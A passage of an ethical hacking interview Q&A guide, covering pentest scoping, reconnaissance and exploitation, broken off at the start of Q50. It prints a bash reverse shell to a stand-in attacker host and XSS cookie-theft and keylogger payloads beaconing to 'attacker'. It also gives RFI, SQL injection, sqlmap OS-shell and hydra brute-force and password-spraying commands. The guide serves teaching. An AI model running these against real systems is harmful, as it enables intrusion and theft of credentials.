# 🎯 ETHICAL HACKING - 100 Interview Questions & Answers

## Priority Legend
- 🔴 **MOST PROBABLE** - Frequently asked, must know
- 🟠 **IMPORTANT** - Commonly asked, should know
- 🟡 **MODERATE** - Sometimes asked, good to know
- 🟢 **DEPTH** - Complex/Advanced, shows expertise

---

## SECTION 1: PENETRATION TESTING FUNDAMENTALS (Q1-Q20)

### 🔴 Q1: What is ethical hacking?
**Answer:**
Ethical hacking (penetration testing) is authorized security testing to identify vulnerabilities before malicious attackers can exploit them.

**Key principles:**
- **Authorization** - Written permission required
- **Scope** - Define what can/cannot be tested
- **Legal** - Comply with laws and regulations
- **Report** - Document and disclose findings
- **Non-malicious** - Don't cause harm

**Difference from malicious hacking:**
| Aspect | Ethical Hacker | Malicious Hacker |
|--------|----------------|------------------|
| Permission | Authorized | Unauthorized |
| Intent | Improve security | Exploit/damage |
| Reporting | Discloses findings | Keeps secret |
| Legal | Legal activity | Criminal activity |

---

### 🔴 Q2: What are the phases of penetration testing?
**Answer:**
```
┌─────────────────────────────────────────────────────────┐
│               PENETRATION TESTING PHASES                 │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. RECONNAISSANCE (Passive & Active)                   │
│     └── Gather information about target                │
│              ↓                                         │
│  2. SCANNING & ENUMERATION                              │
│     └── Identify live hosts, services, vulnerabilities │
│              ↓                                         │
│  3. GAINING ACCESS (Exploitation)                       │
│     └── Exploit vulnerabilities to gain access         │
│              ↓                                         │
│  4. MAINTAINING ACCESS                                  │
│     └── Establish persistence, lateral movement        │
│              ↓                                         │
│  5. COVERING TRACKS                                     │
│     └── Demonstrate how attacker would hide            │
│              ↓                                         │
│  6. REPORTING                                           │
│     └── Document findings and recommendations          │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

### 🔴 Q3: What is the difference between black box, white box, and gray box testing?
**Answer:**
| Type | Knowledge | Simulates | Use Case |
|------|-----------|-----------|----------|
| **Black Box** | No information | External attacker | Real-world external attack |
| **White Box** | Full knowledge (code, architecture) | Insider threat | Comprehensive review |
| **Gray Box** | Partial (user credentials) | Compromised user | Authenticated testing |

**Details:**

**Black Box:**
- Most realistic external scenario
- Time-consuming reconnaissance
- May miss internal vulnerabilities

**White Box:**
- Source code review
- Architecture diagrams provided
- Most thorough but least realistic

**Gray Box:**
- Balance of both
- Common for web app testing
- Tests post-authentication security

---

### 🔴 Q4: What should be included in a penetration testing scope?
**Answer:**
**Scope document includes:**

**In-scope:**
- IP ranges/domains
- Applications
- User types to test
- Testing methods allowed
- Time windows

**Out-of-scope:**
- Systems not to test
- Attack types excluded (DoS?)
- Third-party systems
- Production data restrictions

**Rules of engagement:**
- Start/end dates
- Testing hours
- Escalation contacts
- Data handling
- Evidence collection
- Communication plan

**Legal considerations:**
- Written authorization
- Liability clauses
- NDA requirements

---

### 🔴 Q5: What is reconnaissance? Differentiate active and passive.
**Answer:**
Reconnaissance gathers information about target before attacking.

**Passive Reconnaissance:**
No direct interaction with target.
| Technique | Example |
|-----------|---------|
| OSINT | Google, social media |
| WHOIS | Domain registration |
| DNS enumeration | Public DNS records |
| Job postings | Technology stack |
| Shodan | Internet-facing devices |

**Active Reconnaissance:**
Direct interaction with target.
| Technique | Example |
|-----------|---------|
| Port scanning | Nmap |
| Banner grabbing | Telnet, Netcat |
| Vulnerability scanning | Nessus, Nikto |
| Web spidering | Burp Suite |

**Risk:** Active recon may be detected and logged.

---

### 🔴 Q6: Explain the difference between vulnerability assessment and penetration testing.
**Answer:**
| Aspect | Vulnerability Assessment | Penetration Testing |
|--------|--------------------------|---------------------|
| **Goal** | Identify vulnerabilities | Exploit vulnerabilities |
| **Depth** | Wide but shallow | Deep on specific targets |
| **Exploitation** | No | Yes |
| **Output** | List of vulnerabilities | Attack paths, impact proof |
| **Tools** | Automated scanners | Manual + automated |
| **Risk** | Low | Higher (exploitation) |
| **Frequency** | Regular (monthly/quarterly) | Periodic (annual) |

**Relationship:** VA identifies vulnerabilities, PT proves exploitability.

---

### 🔴 Q7: What is OWASP and why is it important?
**Answer:**
OWASP (Open Web Application Security Project) is a nonprofit focused on software security.

**Key resources:**
| Resource | Description |
|----------|-------------|
| **OWASP Top 10** | Most critical web vulnerabilities |
| **Testing Guide** | Comprehensive testing methodology |
| **ASVS** | Application Security Verification Standard |
| **Cheat Sheets** | Security best practices |
| **ZAP** | Free web security scanner |

**Why important:**
- Industry standard
- Vendor-neutral
- Free resources
- Community-driven
- Regularly updated

---

### 🟠 Q8: What are the common penetration testing methodologies?
**Answer:**
| Methodology | Focus | Organization |
|-------------|-------|--------------|
| **PTES** | General penetration testing | Penetration Testing Execution Standard |
| **OWASP** | Web applications | OWASP Foundation |
| **NIST SP 800-115** | Technical security testing | NIST |
| **OSSTMM** | Security testing methodology | ISECOM |
| **ISSAF** | Information systems security | OISSG |
| **CREST** | Certified testing standards | CREST Council |

**PTES phases:**
1. Pre-engagement
2. Intelligence gathering
3. Threat modeling
4. Vulnerability analysis
5. Exploitation
6. Post-exploitation
7. Reporting

---

### 🟠 Q9: What is a rules of engagement document?
**Answer:**
Rules of Engagement (ROE) defines how testing will be conducted.

**Contents:**
```
┌─────────────────────────────────────────────────────────┐
│               RULES OF ENGAGEMENT                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  TIMELINE                                               │
│  ├── Start/end dates                                   │
│  ├── Testing hours (business hours only?)              │
│  └── Blackout periods                                  │
│                                                         │
│  SCOPE                                                  │
│  ├── Target systems (IP, domain, app)                  │
│  ├── Excluded systems                                  │
│  └── Testing credentials (if gray box)                 │
│                                                         │
│  ALLOWED ACTIVITIES                                     │
│  ├── Port scanning                                     │
│  ├── Vulnerability scanning                            │
│  ├── Exploitation                                      │
│  ├── Social engineering (Y/N)                          │
│  └── Physical access testing (Y/N)                     │
│                                                         │
│  PROHIBITED ACTIVITIES                                  │
│  ├── DoS attacks                                       │
│  ├── Data destruction                                  │
│  └── Attacking third-party                             │
│                                                         │
│  COMMUNICATIONS                                         │
│  ├── Primary contact                                   │
│  ├── Emergency contact                                 │
│  └── Reporting frequency                               │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

### 🟠 Q10: What legal considerations apply to penetration testing?
**Answer:**
**Requirements:**
- **Written authorization** - Get it in writing, signed
- **Scope clarity** - Know exactly what's allowed
- **Third-party systems** - Separate authorization needed (cloud, ISP)
- **Data protection** - Handle discovered data properly
- **Regulatory compliance** - PCI-DSS, HIPAA implications

**Relevant laws:**
- Computer Fraud and Abuse Act (USA)
- Computer Misuse Act (UK)
- GDPR (EU data handling)
- Industry regulations

**Protect yourself:**
- Detailed contract
- Liability insurance
- Clear scope documentation
- Communication records
- Professional conduct

---

### 🟠 Q11: What is the importance of reporting in penetration testing?
**Answer:**
Report is the deliverable that justifies the entire engagement.

**Report components:**
```
┌─────────────────────────────────────────────────────────┐
│              PENETRATION TEST REPORT                     │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  EXECUTIVE SUMMARY                                      │
│  └── Non-technical overview for management             │
│                                                         │
│  SCOPE AND METHODOLOGY                                  │
│  └── What was tested and how                           │
│                                                         │
│  FINDINGS                                               │
│  ├── Vulnerability description                         │
│  ├── Risk rating (CVSS)                               │
│  ├── Proof of concept                                 │
│  ├── Impact                                           │
│  └── Remediation                                      │
│                                                         │
│  ATTACK NARRATIVE                                       │
│  └── Story of the attack path                          │
│                                                         │
│  RECOMMENDATIONS                                        │
│  └── Prioritized remediation plan                      │
│                                                         │
│  APPENDICES                                             │
│  └── Detailed technical data, raw output               │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

**Finding format:**
- Title
- Severity (Critical/High/Medium/Low/Info)
- CVSS score
- Description
- Steps to reproduce
- Evidence (screenshots, code)
- Remediation

---

### 🟠 Q12: What is CVSS?
**Answer:**
CVSS (Common Vulnerability Scoring System) is standardized vulnerability severity rating.

**CVSS v3.1 components:**
| Metric Group | Factors |
|--------------|---------|
| **Base** | Attack Vector, Complexity, Privileges, User Interaction, Scope, Impact |
| **Temporal** | Exploit maturity, remediation level |
| **Environmental** | Organization-specific factors |

**Severity ratings:**
| Score | Severity |
|-------|----------|
| 0.0 | None |
| 0.1-3.9 | Low |
| 4.0-6.9 | Medium |
| 7.0-8.9 | High |
| 9.0-10.0 | Critical |

**Example:**
SQLi with remote access = 9.8 (Critical)
Self-XSS = 3.1 (Low)

---

### 🟡 Q13: What certifications are relevant for ethical hacking?
**Answer:**
| Certification | Organization | Focus |
|---------------|--------------|-------|
| **CEH** | EC-Council | Entry-level ethical hacking |
| **OSCP** | Offensive Security | Hands-on penetration testing |
| **GPEN** | SANS/GIAC | Network penetration testing |
| **GWAPT** | SANS/GIAC | Web application testing |
| **CREST** | CREST Council | UK/international standard |
| **eJPT** | eLearnSecurity | Entry-level practical |
| **eCPPT** | eLearnSecurity | Professional practical |
| **OSWE** | Offensive Security | Web exploitation |

**Most valued:**
- OSCP (industry gold standard)
- GPEN/GWAPT (enterprise)
- CREST (UK government)

---

### 🟡 Q14: What is bug bounty hunting?
**Answer:**
Bug bounty programs reward security researchers for finding vulnerabilities.

**Platforms:**
- HackerOne
- Bugcrowd
- Synack
- Intigriti
- Direct (company programs)

**Key differences from penetration testing:**
| Aspect | Bug Bounty | Pentest |
|--------|------------|---------|
| Scope | Public program rules | Specific contract |
| Payment | Per valid bug | Fixed fee |
| Timeline | Ongoing | Fixed period |
| Competition | Many hunters | Exclusive |
| Reporting | Through platform | Direct to client |

**Tips:**
- Read scope carefully
- Don't test out of scope
- Good reports increase payouts
- Respect responsible disclosure

---

### 🟡 Q15: What is red teaming vs penetration testing?
**Answer:**
| Aspect | Penetration Testing | Red Teaming |
|--------|---------------------|-------------|
| **Goal** | Find vulnerabilities | Test detection/response |
| **Scope** | Defined assets | Broad (whole organization) |
| **Stealth** | Not primary concern | Critical |
| **Duration** | Days to weeks | Weeks to months |
| **Methods** | Technical only | Technical + social + physical |
| **Defenders** | Usually aware | Often unaware ("purple team" if aware) |

**Red team activities:**
- Phishing campaigns
- Physical intrusion
- Social engineering
- Long-term persistence
- Detection evasion

---

### 🟡 Q16: What is purple teaming?
**Answer:**
Purple teaming combines red team (offense) and blue team (defense) for collaborative improvement.

**Process:**
```
Red Team                    Blue Team
    │                           │
    │ Execute attack technique  │
    │────────────────────────→ │
    │                           │ Try to detect
    │                           │
    │ ←────────────────────────│
    │   Feedback (detected?)    │
    │                           │
    │ Adjust/improve           │ Improve detection
    │                           │
    └───────────────────────────┘
         Iterate and improve
```

**Benefits:**
- Faster improvement
- Knowledge transfer
- Better detection coverage
- Measure security capability

---

### 🟢 Q17: What is adversary emulation?
**Answer:**
Adversary emulation replicates specific threat actor TTPs.

**Process:**
1. **Choose adversary** - Relevant APT group
2. **Research TTPs** - MITRE ATT&CK, threat intel
3. **Develop plan** - Map techniques to test
4. **Execute** - Follow adversary playbook
5. **Assess** - How well did defenses perform?

**Example:**
Emulate APT29 (Cozy Bear):
- Spear phishing with document
- PowerShell stager
- Cobalt Strike
- Domain escalation

**Tools:**
- MITRE ATT&CK Navigator
- Atomic Red Team
- CALDERA
- Cobalt Strike

---

### 🟢 Q18: What are Assumed Breach scenarios?
**Answer:**
Assumed Breach testing starts with attacker already having internal access.

**Scenarios:**
- Compromised user account given
- Malware already on endpoint
- Network access provided

**Purpose:**
- Test internal controls
- Evaluate detection capability
- Test incident response
- Measure lateral movement difficulty

**Benefits:**
- Faster to valuable findings
- Tests "what if perimeter fails"
- More realistic for insider threat
- Better for mature organizations

---

### 🟢 Q19: What is a penetration test proposal?
**Answer:**
Proposal is business document outlining planned testing.

**Contents:**
```
┌─────────────────────────────────────────────────────────┐
│               PENETRATION TEST PROPOSAL                  │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  EXECUTIVE OVERVIEW                                     │
│  └── Why testing is needed                             │
│                                                         │
│  SCOPE OF WORK                                          │
│  ├── Systems to test                                   │
│  ├── Test types                                        │
│  └── Exclusions                                        │
│                                                         │
│  METHODOLOGY                                            │
│  └── Testing approach                                  │
│                                                         │
│  TIMELINE                                               │
│  └── Project schedule                                  │
│                                                         │
│  DELIVERABLES                                           │
│  └── Reports, presentations                            │
│                                                         │
│  PRICING                                                │
│  └── Cost breakdown                                    │
│                                                         │
│  TEAM                                                   │
│  └── Tester qualifications                             │
│                                                         │
│  TERMS AND CONDITIONS                                   │
│  └── Liability, NDA, payment terms                     │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

### 🟢 Q20: What is responsible disclosure?
**Answer:**
Responsible disclosure is the practice of reporting vulnerabilities ethically.

**Process:**
1. **Discover** vulnerability
2. **Document** with proof of concept
3. **Report** to vendor privately
4. **Wait** for fix (90 days standard)
5. **Coordinate** disclosure date
6. **Publish** after patch available

**Timeline considerations:**
- 90 days industry standard (Google Project Zero)
- Extensions for complex fixes
- Faster if actively exploited

**If vendor unresponsive:**
- Escalate to CERT
- Consider public disclosure
- Protect users

---

## SECTION 2: RECONNAISSANCE & SCANNING (Q21-Q40)

### 🔴 Q21: What tools do you use for reconnaissance?
**Answer:**
**Passive recon:**
| Tool | Purpose |
|------|---------|
| Google Dorks | Find exposed info |
| theHarvester | Email, subdomain discovery |
| Shodan | Internet-connected devices |
| Censys | Internet-wide scanning |
| Maltego | OSINT visualization |
| Recon-ng | Recon framework |
| SpiderFoot | Automated OSINT |
| LinkedIn | Employee enumeration |

**Active recon:**
| Tool | Purpose |
|------|---------|
| Nmap | Port scanning |
| Masscan | Fast port scanning |
| Nikto | Web server scanning |
| Gobuster | Directory/subdomain brute force |
| DNSRecon | DNS enumeration |

---

### 🔴 Q22: What are Google dorks?
**Answer:**
Google dorks are advanced search operators to find sensitive information.

**Common operators:**
| Operator | Function | Example |
|----------|----------|---------|
| site: | Limit to domain | site:target.com |
| filetype: | Specific file type | filetype:pdf |
| intitle: | In page title | intitle:"index of" |
| inurl: | In URL | inurl:admin |
| intext: | In page body | intext:password |
| cache: | Cached version | cache:target.com |

**Useful dorks:**
```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:db
"target.com" password filetype:log
```

**Google Hacking Database (GHDB):** exploit-db.com/google-hacking-database

---

### 🔴 Q23: How do you perform port scanning with Nmap?
**Answer:**
**Basic scans:**
```bash
# Quick scan top 1000 ports
nmap 192.168.1.1

# Scan all ports
nmap -p- 192.168.1.1

# Scan specific ports
nmap -p 80,443,22,3389 192.168.1.1

# Service/version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan
nmap -A 192.168.1.1

# Full comprehensive scan
nmap -sC -sV -p- 192.168.1.1
```

**Scan types:**
| Flag | Type | Description |
|------|------|-------------|
| -sS | SYN scan | Stealthy (default with root) |
| -sT | Connect scan | Full TCP connection |
| -sU | UDP scan | UDP ports |
| -sA | ACK scan | Firewall mapping |
| -sN | Null scan | No flags set |

---

### 🔴 Q24: What is banner grabbing?
**Answer:**
Banner grabbing retrieves service information from open ports.

**Methods:**
```bash
# Netcat
nc -v target.com 80
GET / HTTP/1.1
Host: target.com

# Telnet
telnet target.com 22

# Nmap
nmap -sV --script=banner target.com

# Curl for HTTP
curl -I target.com
```

**Information revealed:**
- Service type
- Version number
- Operating system
- Configuration details

**Defense:**
- Remove/modify banners
- Security through diversity
- Keep services updated

---

### 🔴 Q25: How do you enumerate subdomains?
**Answer:**
**Passive methods:**
```bash
# Certificate transparency
curl "https://crt.sh/?q=%25.target.com&output=json"

# DNS aggregators
# Sublist3r (uses multiple sources)
sublist3r -d target.com

# theHarvester
theHarvester -d target.com -b all
```

**Active methods:**
```bash
# DNS brute force
gobuster dns -d target.com -w wordlist.txt

# Amass (comprehensive)
amass enum -d target.com

# DNSRecon
dnsrecon -d target.com -t brt
```

**Online tools:**
- crt.sh
- SecurityTrails
- VirusTotal
- Shodan

---

### 🟠 Q26: What is OSINT?
**Answer:**
OSINT (Open Source Intelligence) is information gathered from public sources.

**Sources:**
| Category | Sources |
|----------|---------|
| **Search engines** | Google, Bing, DuckDuckGo |
| **Social media** | LinkedIn, Twitter, Facebook |
| **Public records** | WHOIS, company filings |
| **Code repos** | GitHub, GitLab |
| **Job postings** | Indeed, company careers |
| **Technical** | Shodan, Censys, crt.sh |
| **Archives** | Wayback Machine |
| **Paste sites** | Pastebin, GitHub Gists |

**OSINT for pentesting:**
- Employee names/emails
- Technology stack
- IP ranges
- Credential leaks
- Organizational structure

---

### 🟠 Q27: How do you perform directory enumeration?
**Answer:**
Directory enumeration finds hidden paths on web servers.

**Tools:**
```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Dirbuster (GUI)
dirbuster

# FFuf (fast)
ffuf -u http://target.com/FUZZ -w wordlist.txt

# Dirb
dirb http://target.com

# Feroxbuster
feroxbuster -u http://target.com
```

**Good wordlists:**
- /usr/share/seclists/Discovery/Web-Content/
- common.txt
- big.txt
- raft-large-directories.txt

**What to look for:**
- /admin, /backup, /config
- .git, .svn, .env
- /api, /swagger, /docs
- Old versions (/v1, /test)

---

### 🟠 Q28: What is DNS enumeration?
**Answer:**
DNS enumeration discovers DNS records and infrastructure.

**Record types:**
| Record | Information |
|--------|-------------|
| A | IPv4 address |
| AAAA | IPv6 address |
| MX | Mail servers |
| NS | Name servers |
| TXT | Verification, SPF |
| CNAME | Aliases |
| SOA | Zone authority |

**Commands:**
```bash
# Dig
dig target.com ANY
dig target.com MX
dig @ns1.target.com target.com AXFR

# Nslookup
nslookup -type=any target.com

# DNSRecon
dnsrecon -d target.com

# Fierce (zone transfer)
fierce --domain target.com
```

**Zone transfer (AXFR):**
If misconfigured, reveals all DNS records.

---

### 🟠 Q29: What is Shodan and how is it used?
**Answer:**
Shodan is a search engine for internet-connected devices.

**Uses:**
- Find exposed services
- Identify vulnerable systems
- Discover IoT devices
- Infrastructure mapping

**Searches:**
```
# Basic search
hostname:target.com

# By port
hostname:target.com port:22

# By product
hostname:target.com product:Apache

# Vulnerable services
vuln:CVE-2021-44228

# Industrial systems
port:502 country:US
```

**Filters:**
- hostname:, ip:
- port:
- country:, city:
- org:
- product:, version:
- os:
- vuln: (requires academic/API)

---

### 🟠 Q30: How do you identify technologies used by a web application?
**Answer:**
**Browser-based:**
- Wappalyzer extension
- BuiltWith extension
- View page source
- Developer tools (Network tab)

**Command-line:**
```bash
# WhatWeb
whatweb target.com

# Wad
wad -u target.com

# Webanalyze
webanalyze -host target.com
```

**Manual checks:**
- HTTP headers (Server, X-Powered-By)
- Cookie names (JSESSIONID = Java)
- Error messages
- File extensions (.php, .aspx)
- HTML comments
- JavaScript libraries

**Headers revealing info:**
```
Server: Apache/2.4.41
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
```

---

### 🟠 Q31: What is service enumeration?
**Answer:**
Service enumeration gathers detailed information about running services.

**Per-service techniques:**
| Service | Enumeration |
|---------|-------------|
| **SMB** | smbclient, enum4linux |
| **LDAP** | ldapsearch |
| **SNMP** | snmpwalk |
| **DNS** | dig, nslookup |
| **NFS** | showmount |
| **FTP** | anonymous login |
| **SMTP** | VRFY, EXPN commands |
| **RPC** | rpcinfo |

**Examples:**
```bash
# SMB
smbclient -L //target -N
enum4linux target

# SNMP
snmpwalk -c public -v1 target

# NFS
showmount -e target
```

---

### 🟡 Q32: What is vulnerability scanning vs penetration testing?
**Answer:**
| Aspect | Vulnerability Scan | Pentest |
|--------|-------------------|---------|
| Method | Automated | Manual + automated |
| Exploitation | No | Yes |
| Depth | Surface level | Deep |
| False positives | Many | Few (manually verified) |
| Output | Vulnerability list | Attack narrative |
| Skill required | Lower | Higher |

**Vulnerability scanners:**
- Nessus
- OpenVAS
- Qualys
- Nexpose
- Nikto (web-specific)

**When to use:**
- Vuln scan: Regular, automated security checks
- Pentest: Periodic deep-dive assessment

---

### 🟡 Q33: How do you enumerate SMB?
**Answer:**
SMB (port 445/139) enumeration reveals shares, users, and more.

```bash
# List shares
smbclient -L //target -N
smbmap -H target

# Connect to share
smbclient //target/share -N

# Enum4linux (comprehensive)
enum4linux -a target

# Nmap scripts
nmap -p 445 --script=smb-enum* target

# CrackMapExec
crackmapexec smb target -u '' -p '' --shares
```

**What to find:**
- Accessible shares
- User accounts
- Password policy
- Domain information
- Sensitive files

---

### 🟡 Q34: How do you enumerate SNMP?
**Answer:**
SNMP (port 161/UDP) can leak extensive system information.

```bash
# Community string brute force
onesixtyone -c community.txt target

# Walk MIB tree
snmpwalk -c public -v1 target
snmpwalk -c public -v2c target 1.3.6.1

# Specific OIDs
# System info
snmpwalk -c public -v1 target 1.3.6.1.2.1.1

# Network interfaces
snmpwalk -c public -v1 target 1.3.6.1.2.1.2

# Running processes
snmpwalk -c public -v1 target 1.3.6.1.2.1.25.4.2
```

**Common community strings:**
- public
- private
- manager
- cisco

**Information revealed:**
- System details
- Running processes
- Network configuration
- User accounts
- Software versions

---

### 🟡 Q35: What is email enumeration?
**Answer:**
Email enumeration discovers valid email addresses.

**Methods:**

**1. SMTP VRFY/EXPN:**
```bash
nc target.com 25
VRFY john
250 john@target.com
```

**2. theHarvester:**
```bash
theHarvester -d target.com -b all
```

**3. Hunter.io / Phonebook.cz**

**4. LinkedIn + email pattern:**
```
firstname.lastname@company.com
first.last@company.com
flast@company.com
```

**5. Google dorks:**
```
"@target.com" filetype:pdf
site:linkedin.com "target.com"
```

**Use cases:**
- Phishing campaigns
- Password spraying
- Social engineering

---

### 🟡 Q36: How do you perform network mapping?
**Answer:**
Network mapping discovers hosts and topology.

**Host discovery:**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l

# Netdiscover
netdiscover -r 192.168.1.0/24
```

**Topology mapping:**
```bash
# Traceroute
traceroute target.com

# Nmap traceroute
nmap --traceroute target

# Zenmap (GUI)
zenmap
```

**Documentation:**
- IP ranges
- Live hosts
- Network segments
- Gateways
- Security devices

---

### 🟢 Q37: What is OSINT for username enumeration?
**Answer:**
Finding usernames across platforms:

**Tools:**
```bash
# Sherlock
sherlock username

# Namechk
# https://namechk.com

# KnowEm
# https://knowem.com
```

**Manual sources:**
- GitHub (commits show email)
- LinkedIn
- Twitter
- Company directories
- Data breaches (haveibeenpwned)
- Pastebin

**Username patterns:**
- Email prefix
- First name + last initial
- Social media handles

---

### 🟢 Q38: How do you enumerate web application users?
**Answer:**
**Techniques:**

**1. Error message differences:**
```
"Invalid username" vs "Invalid password"
```

**2. Response time differences:**
```
Valid user = longer (password check)
```

**3. Password reset:**
```
"Email sent" = valid user
"User not found" = invalid
```

**4. Registration:**
```
"Username taken" = valid user
```

**5. API endpoints:**
```bash
ffuf -u http://target/api/user/FUZZ -w usernames.txt
```

**6. Forgot password:**
Different behavior for valid/invalid users.

---

### 🟢 Q39: What is cloud asset enumeration?
**Answer:**
Finding target's cloud resources:

**AWS:**
```bash
# S3 buckets
aws s3 ls s3://target-bucket --no-sign-request

# Bucket finder
bucket_finder target.com

# S3Scanner
s3scanner scan --bucket-file buckets.txt
```

**Azure:**
- Check for *.blob.core.windows.net
- *.azurewebsites.net

**GCP:**
- storage.googleapis.com

**Tools:**
- CloudBrute
- cloud_enum
- GrayhatWarfare (public buckets)

**What to find:**
- Misconfigured storage
- Exposed databases
- API keys in storage
- Backup files

---

### 🟢 Q40: What is wireless reconnaissance?
**Answer:**
Wireless network discovery and assessment:

**Tools:**
```bash
# Aircrack-ng suite
airmon-ng start wlan0
airodump-ng wlan0mon

# Kismet (passive)
kismet

# Bettercap
bettercap -iface wlan0
```

**Information gathered:**
- SSID names
- Encryption types
- Client devices
- Signal strength
- Hidden networks

**Attacks possible:**
- WPA2 handshake capture
- Evil twin
- Deauthentication
- Rogue AP

---

## SECTION 3: EXPLOITATION (Q41-Q60)

### 🔴 Q41: What is Metasploit Framework?
**Answer:**
Metasploit is the most popular penetration testing framework.

**Components:**
```bash
# Start Metasploit
msfconsole

# Basic workflow
msf6> search exploit_name
msf6> use exploit/path/to/exploit
msf6> show options
msf6> set RHOSTS target
msf6> set PAYLOAD payload/type
msf6> exploit
```

**Module types:**
| Type | Purpose |
|------|---------|
| Exploits | Code to exploit vulnerabilities |
| Payloads | Code to run after exploitation |
| Auxiliary | Scanning, fuzzing, etc. |
| Post | Post-exploitation modules |
| Encoders | Payload obfuscation |

**Payload types:**
- Singles (standalone)
- Stagers (small, loads stage)
- Stages (loaded by stager)

---

### 🔴 Q42: What is a reverse shell vs bind shell?
**Answer:**
```
REVERSE SHELL                  BIND SHELL
─────────────                  ──────────

Attacker              Target   Attacker              Target
    │                    │         │                    │
    │ Listen on port     │         │                    │ Listen on port
    ◄────────────────────│         │────────────────────►
    │ Target connects    │         │ Attacker connects  │
    │ back to attacker   │         │ to target         │
```

**Reverse shell:**
- Target connects OUT to attacker
- Bypasses inbound firewall rules
- More common in practice

**Bind shell:**
- Target opens port for attacker
- Blocked by most firewalls
- Easier to detect

**Reverse shell example:**
```bash
# Attacker
nc -lvnp 4444

# Target (bash)
bash -i >& /dev/tcp/attacker-ip/4444 0>&1
```

---

### 🔴 Q43: What are common payload types?
**Answer:**
| Payload | Description | Use Case |
|---------|-------------|----------|
| **Meterpreter** | Advanced, in-memory | Full control |
| **Shell** | Basic command shell | Simple access |
| **Reverse TCP** | Connect back via TCP | Most firewalls |
| **Reverse HTTP/S** | Connect via HTTP/S | Web proxy allowed |
| **Bind TCP** | Listen on port | Internal networks |
| **VNC/RDP** | GUI access | Graphical systems |

**Meterpreter advantages:**
- Runs in memory
- Multiple channels
- Built-in post modules
- Evasion capabilities
- Pivoting support

---

### 🔴 Q44: How do you exploit SQL injection?
**Answer:**
**Manual testing:**
```sql
# Basic test
' OR '1'='1
' OR 1=1--
" OR ""="

# Union-based
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

# Error-based
' AND 1=CONVERT(int,@@version)--

# Time-based blind
' OR SLEEP(5)--
' OR IF(1=1,SLEEP(5),0)--
```

**SQLMap automation:**
```bash
# Basic scan
sqlmap -u "http://target/page?id=1"

# With forms
sqlmap -u "http://target/login" --data="user=a&pass=b"

# Extract database
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://target/page?id=1" --os-shell
```

---

### 🔴 Q45: How do you exploit XSS vulnerabilities?
**Answer:**
**Testing payloads:**
```javascript
// Basic
<script>alert('XSS')</script>

// With event handlers
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">

// Bypassing filters
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert`XSS`>
<ScRiPt>alert('XSS')</ScRiPt>

// Cookie theft
<script>document.location='http://attacker/steal.php?c='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){
  new Image().src='http://attacker/log?k='+e.key
}</script>
```

**Types:**
- Reflected (non-persistent)
- Stored (persistent)
- DOM-based

---

### 🔴 Q46: What is password cracking?
**Answer:**
**Methods:**
| Method | Description | Speed |
|--------|-------------|-------|
| Brute force | Try all combinations | Slowest |
| Dictionary | Try word list | Fast |
| Rule-based | Dictionary with rules | Fast |
| Rainbow tables | Pre-computed hashes | Fastest |
| Hybrid | Combination methods | Medium |

**Tools:**
```bash
# John the Ripper
john --wordlist=rockyou.txt hashes.txt
john --format=raw-md5 hashes.txt

# Hashcat
hashcat -m 0 hashes.txt rockyou.txt  # MD5
hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
hashcat -m 1800 hashes.txt rockyou.txt  # sha512crypt

# Hydra (online)
hydra -l admin -P passwords.txt target ssh
hydra -L users.txt -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

---

### 🟠 Q47: How do you attack network services?
**Answer:**
**Common attacks:**

**SSH:**
```bash
hydra -l root -P passwords.txt target ssh
ncrack -p 22 --user root -P passwords.txt target
```

**RDP:**
```bash
hydra -l administrator -P passwords.txt rdp://target
crowbar -b rdp -s target/32 -u admin -C passwords.txt
```

**SMB:**
```bash
crackmapexec smb target -u users.txt -p passwords.txt
smbclient //target/share -U user%password
```

**FTP:**
```bash
hydra -l anonymous -P passwords.txt target ftp
# Check anonymous access
ftp target
> anonymous
> anonymous@
```

---

### 🟠 Q48: What is password spraying?
**Answer:**
Password spraying tries one password against many accounts to avoid lockouts.

**Technique:**
```
Traditional brute force:     Password spraying:
user1:pass1,pass2,pass3     user1:Spring2024!
user1 locked out!            user2:Spring2024!
                             user3:Spring2024!
                             (wait for lockout window)
                             user1:Summer2024!
                             ...
```

**Tools:**
```bash
# Spray web login
spray.py -h target.com -U users.txt -P 'Spring2024!'

# Spray Office 365
o365spray --spray -u users.txt -p 'Password1!'

# Spray SMB
crackmapexec smb target -u users.txt -p 'Spring2024!'
```

**Common passwords:**
- Season + Year + !
- Company name + numbers
- Welcome1, Password1

---

### 🟠 Q49: How do you exploit LFI/RFI?
**Answer:**
**Local File Inclusion (LFI):**
```bash
# Basic
http://target/page?file=../../../etc/passwd

# With null byte (older PHP)
http://target/page?file=../../../etc/passwd%00

# Using wrappers
http://target/page?file=php://filter/convert.base64-encode/resource=index.php

# Log poisoning for RCE
# Inject PHP into logs, then include log file
```

**Remote File Inclusion (RFI):**
```bash
# Include remote file
http://target/page?file=http://attacker/shell.php

# Host payload
python3 -m http.server 80
# Create shell.php with command execution
```

**Escalation to RCE:**
1. Log poisoning
2. PHP wrappers
3. /proc/self/environ
4. Session files

---

### 🟠 Q50: What is command injection?
**Answer:**
Command injection executes OS commands through application.

**Testing:**
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
```

**Examples:**
```bash
# Ping functionality
